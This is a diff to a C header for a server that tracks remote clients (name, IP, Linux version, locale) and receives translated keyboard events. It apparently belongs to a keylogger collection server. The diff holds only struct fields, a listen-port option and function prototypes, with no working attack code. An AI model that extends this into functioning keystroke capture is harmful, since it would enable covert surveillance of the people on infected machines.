@@ -8,7 +8,6 @@
 
 #define QUEUE_BUFFER_SIZE 1024
 #define STRING_BUFFER_SIZE 256
-#define SERVER_PORT 4444
 
 /* meant for key translations from xkbcommon and the event we receive. :^) */
 typedef struct translated_key {
@@ -31,6 +30,7 @@ struct client_state {
   char name[STRING_BUFFER_SIZE];
   char ipaddr[STRING_BUFFER_SIZE];
   char linux_version[STRING_BUFFER_SIZE];
+  char locale[STRING_BUFFER_SIZE];
 
   TAILQ_ENTRY(client_state) clients;
 };
@@ -38,13 +38,21 @@ struct client_state {
 /* main server object */
 typedef struct server_state {
 
-  /*
-      TODO:
-      configure logger, encryption management & database connection here
-  */
-
   /* current clients */
   TAILQ_HEAD(listhead, client_state) clients;
+
+  struct user_options {
+        char const db_filepath[STRING_BUFFER_SIZE]; // sqlite .db filepath
+        unsigned short listen_port;
+
+        /*
+            TODO:
+            add encryption key config here, once protocol impl. is finished
+        */
+  } options;
+
+
+  int sockfd;
 } server_t;
 
 #define SUCCESSFUL 1
@@ -67,5 +75,9 @@ typedef struct server_state {
 #define KEY_RELEASED 0
 
 // net.c
+int init_remote_connection(server_t *instance);
+
+// lexxer.c
+int parse_cli_arguments(server_t *instance, int ac, char **av, char **envp);
 
 #endif /* SERVER_H */
